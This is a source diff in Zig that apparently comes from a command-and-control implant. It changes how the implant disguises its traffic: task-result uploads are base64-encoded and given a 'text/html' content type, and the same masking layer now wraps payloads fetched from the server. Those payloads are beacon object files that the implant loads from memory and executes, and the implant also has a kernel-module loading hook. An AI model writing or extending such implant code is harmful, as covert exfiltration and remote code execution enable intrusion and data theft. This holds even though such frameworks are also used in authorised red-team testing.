@@ -7,7 +7,7 @@ pub const std_options = std.Options{
     .http_disable_tls = true,
     .log_level = .info,
 };
-const debug_proxy_enabled = true;
+const debug_proxy_enabled = false;
 const debug_proxy_host = "127.0.0.1";
 const debug_proxy_port = 8080;
 
@@ -152,6 +152,7 @@ fn netHttpExchange(s: *State, connectionType: netConnectionType, conn: *std.http
     var uri: std.Uri = undefined;
     var body_data: ?[]u8 = null;
     var bof_res: ?*BofRes = null;
+    var masked_body_len: u32 = 0;
 
     //prepare request options
     const server_header_buffer = s.allocator.alloc(u8, 16 * 1024) catch return null;
@@ -200,7 +201,7 @@ fn netHttpExchange(s: *State, connectionType: netConnectionType, conn: *std.http
 
         // apply HTTP header transforms and
         // mask body data according to transforms implemented in netMasquerade(...) and assign it to 'body_data' which will be sent
-        var masked_body_len: u32 = 0;
+        masked_body_len = 0;
         const masked_body: ?[*]u8 = @ptrCast(s.implant_actions.netMasquerade(s, connectionType, http_reqOptions, bof_res, &masked_body_len));
         if(masked_body) |body| {
             body_data = @as([*]u8, @ptrCast(@constCast(body)))[0..masked_body_len];        
@@ -233,6 +234,9 @@ fn netHttpExchange(s: *State, connectionType: netConnectionType, conn: *std.http
     };
     defer s.allocator.destroy(http_request);
 
+    if(connectionType == netConnectionType.TaskResult and body_data != null)
+        http_request.transfer_encoding = .{ .content_length = masked_body_len };
+
     // sends HTTP header
     http_request.send() catch unreachable;
 
@@ -246,6 +250,9 @@ fn netHttpExchange(s: *State, connectionType: netConnectionType, conn: *std.http
     // get the for response
     // TODO make sure that HTTP 200 was returned
     http_request.wait() catch return null;
+    //if (http_request.response.status != .ok) {
+    //    return error.BadData;
+    //}
 
     const body_resp_content = s.allocator.alloc(u8, @intCast(http_request.response.content_length.?)) catch return null;
     errdefer s.allocator.free(body_resp_content);
@@ -265,7 +272,6 @@ fn netHttpExchange(s: *State, connectionType: netConnectionType, conn: *std.http
 fn netMasquerade(state: *anyopaque, connectionType: netConnectionType, hdr_to_mask: *anyopaque, data_to_mask: ?*anyopaque, len: *u32) callconv(.C) ?*anyopaque {
     const s: *State = @ptrCast(@alignCast(state));
     const http_reqOptions: *std.http.Client.RequestOptions = @ptrCast(@alignCast(hdr_to_mask));
-    //const bof_res: *BofRes = @ptrCast(@alignCast(data_to_mask));
 
     const res = netHttpMasquerade(s, connectionType, http_reqOptions, data_to_mask, len) catch |err| switch (err) {
         error.OutOfMemory => return null,
@@ -313,6 +319,11 @@ fn netHttpMasquerade(s: *State, connectionType: netConnectionType, http_reqOptio
             .override = try std.fmt.allocPrintZ(s.allocator, "result:{d}", .{bof_res.?.status_code})
         };
 
+        // header transforms: content_type -> "text/html"
+        http_reqOptions.headers.content_type = std.http.Client.Request.Headers.Value {
+            .override = "text/html",
+        };
+
         // data / body transforms: base64(body)
         if(bof_res.?.output != null) {
 
@@ -323,6 +334,8 @@ fn netHttpMasquerade(s: *State, connectionType: netConnectionType, http_reqOptio
             const body = @as([*]u8, @ptrCast(@constCast(bof_res.?.output)))[0..bof_res.?.len];        
             _ = s.base64_encoder.encode(out_b64, body);
 
+            std.log.info("Bof launcher output (base64): {s}", .{out_b64});
+
             // update len and return pointer to new buffer
             len.* = @intCast(new_body_len); 
             return out_b64;
@@ -332,44 +345,34 @@ fn netHttpMasquerade(s: *State, connectionType: netConnectionType, http_reqOptio
     return null;
 }
 
-fn netUnmasquerade(state: *anyopaque, pkt_hdr: *anyopaque, pkt_data: ?*anyopaque, len: *u32) callconv(.C) ?*anyopaque {
+fn netUnmasquerade(state: *anyopaque, connectionType: netConnectionType, pkt_data: ?*anyopaque, len: *u32) callconv(.C) ?*anyopaque {
     const s: *State = @ptrCast(@alignCast(state));
-    const req: *std.http.Client.Request = @ptrCast(@alignCast(pkt_hdr));
 
+    const res = netHttpUnmasquerade(s, connectionType, pkt_data, len) catch |err| switch (err) {
+        error.OutOfMemory => return null,
+        else => return null,
+    };
+
+    if(res != null) {
+        return @ptrCast(res.?.ptr);
+    }
+    else
+        return null;
+}
+
+fn netHttpUnmasquerade(s: *State, connectionType: netConnectionType, pkt_data: ?*anyopaque, len: *u32) !?[]u8 {
+    _ = connectionType;
     _ = s;
 
-    std.log.info("req response status: {s}", .{req.response.status.phrase() orelse ""});
-    if (req.response.status != .ok) {
-        std.log.err("netConnect: Expected response status '200 OK' got '{} {s}'", .{
-            @intFromEnum(req.response.status),
-            req.response.status.phrase() orelse "",
-        });
-        return null;
+    //TODO: else if based on connection type
+    if(pkt_data != null) {
+        const body = @as([*]u8, @ptrCast(@constCast(pkt_data.?)))[0..len.*];
+        // TODO: performs all needed transforms
+        len.* = @intCast(body.len);
+        return body;
     }
 
-    var iter = req.response.iterateHeaders();
-    var content_type: std.http.Header = undefined;
-    while (iter.next()) |hdr| {
-        if (std.mem.eql(u8, hdr.name, "Content-Type")) {
-            content_type = hdr;
-            break;
-        }
-    }
-
-    std.log.info("Content type: {s}", .{content_type.value});
-
-    if (!std.ascii.eqlIgnoreCase(content_type.value, "text/html; charset=utf-8")) {
-        return null;
-    }
-
-    std.log.info("end of unmasqerade", .{});
-
-    // copy and process data/len accordingly and return pointer to data ready for command processing
-    // update len with a new length of the data:
-    // const old_len = len.*;
-    // len.* = new_len;
-    _ = len;
-    return pkt_data;
+    return null;
 }
 
 //
@@ -476,7 +479,7 @@ const ImplantActions = struct {
 
     netExchange: *const fn (state: *anyopaque, connectionType: netConnectionType, net_connection: *anyopaque, len: *u32, extra_data: ?*anyopaque) callconv(.C) ?*anyopaque = undefined,
 
-    netUnmasquerade: *const fn (state: *anyopaque, hdr: *anyopaque, data: ?*anyopaque, len: *u32) callconv(.C) ?*anyopaque = undefined,
+    netUnmasquerade: *const fn (state: *anyopaque, connectionType: netConnectionType, data: ?*anyopaque, len: *u32) callconv(.C) ?*anyopaque = undefined,
     netMasquerade: *const fn (state: *anyopaque, connectionType: netConnectionType, hdr_to_mask: *anyopaque, data_to_mask: ?*anyopaque, len: *u32) callconv(.C) ?*anyopaque = undefined,
 
     kmodLoad: ?*const fn (module_image: [*]const u8, len: usize, param_values: [*:0]const u8) callconv(.C) c_int = null,
@@ -544,11 +547,14 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, task_fields:
 
         if (net_conn) |conn| {
             var body_len: u32 = 0;
-            const bof_content: ?[*]u8 = @ptrCast(state.implant_actions.netExchange(state, netConnectionType.ResourceFetch, conn, &body_len, @constCast(@ptrCast(bof_path.ptr))));
+            const masked_bof_content: ?[*]u8 = @ptrCast(state.implant_actions.netExchange(state, netConnectionType.ResourceFetch, conn, &body_len, @constCast(@ptrCast(bof_path.ptr))));
             std.log.info("after BOF fetch (BOF size: {d}", .{body_len});
 
+            var new_body_len = body_len;
+            const bof_content: ?[*]u8 = @ptrCast(state.implant_actions.netUnmasquerade(state, netConnectionType.ResourceFetch, @constCast(@ptrCast(masked_bof_content)), &new_body_len));
+
             if (bof_content) |b| {
-                bof_to_exec = try bof.Object.initFromMemory(b[0..body_len]);
+                bof_to_exec = try bof.Object.initFromMemory(b[0..new_body_len]);
                 errdefer bof_to_exec.release();
 
                 if (is_persistent) {
